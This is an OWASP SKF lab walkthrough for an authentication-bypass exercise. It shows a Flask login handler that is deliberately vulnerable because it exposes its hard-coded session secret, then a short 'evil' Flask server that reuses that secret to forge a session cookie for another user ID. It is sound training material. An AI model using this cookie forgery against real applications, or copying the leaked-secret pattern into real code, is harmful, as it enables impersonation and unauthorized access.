# Auth-Bypass

## Running the app on Docker

```
$ sudo docker pull blabla1337/owasp-skf-lab:auth-bypass
```

```
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:auth-bypass
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Reconnaissance

Let's login with admin/admin:

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/python/Auth-Bypass/1.png)

Once we login we see an API key.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/python/Auth-Bypass/2.png)

Let's have a look at the source code:

```python

app.config.update(dict(
    SECRET_KEY= "e5ac-4ebf-03e5-9e29-a3f562e10b22",
    SESSION_COOKIE_HTTPONLY = True
))

@app.route("/login", methods=['GET', 'POST'])
def login():
    sqli  = Classes()
    if request.method == "POST":
        values = sqli.getUser(request.form['username'])
        if values:
            if values[0][2] == request.form['password']:
                session['userId'] = values[0][0]
                session['secret'] = app.config['SECRET_KEY']
                session['loggedin'] = True
                pref = sqli.getApi(values[0][0])
                api = pref[0][0]
                return render_template("loggedin.html", api = api)
        return render_template("index.html")
    else:
        pref = sqli.getApi(session['userId'])
        api = pref[0][0]
        return render_template("loggedin.html", api = api)
```

We can see the cookie session secret is exposed, now we can try to recreate this application cookie implementation to be able to recreate a cookie to bypass the authentication.

## Exploitation

We can start building our malicious server.

```python
from flask import Flask, request, url_for, render_template, redirect, make_response, session

app = Flask(__name__, static_url_path='/static', static_folder='static')

app.config.update(dict(
    SECRET_KEY= "e5ac-4ebf-03e5-9e29-a3f562e10b22",
    SESSION_COOKIE_HTTPONLY = False
))

app.config['DEBUG'] = True

@app.route("/")
def start():
    session['userId'] = 2 # CHANGING USER ID
    session['secret'] = app.config['SECRET_KEY']
    session['loggedin'] = True
    return render_template("evil.html")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337)
```

Save the snippet above to &gt; evil_server.py and run the commands below to install some dependencies.
Of course you can also run your app on whatever service you want it does not have to be python flask.

```text
$ pip3 install flask
```

Save the following snippet code into /templates/evil.html

```html
<p>The newly created cookie for doing the bypass:</p>
<script>
  alert(document.cookie);
</script>
```

We are ready to start our server:

```text
$ python3 evil_server.py
```

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/python/Auth-Bypass/3.png)

Now we can replace our original cookie with the tampered cookie.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/python/Auth-Bypass/4.png)

Send the request again:

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/python/Auth-Bypass/5.png)

## Additional sources

{% embed url="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" %}

{% embed url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema" %}
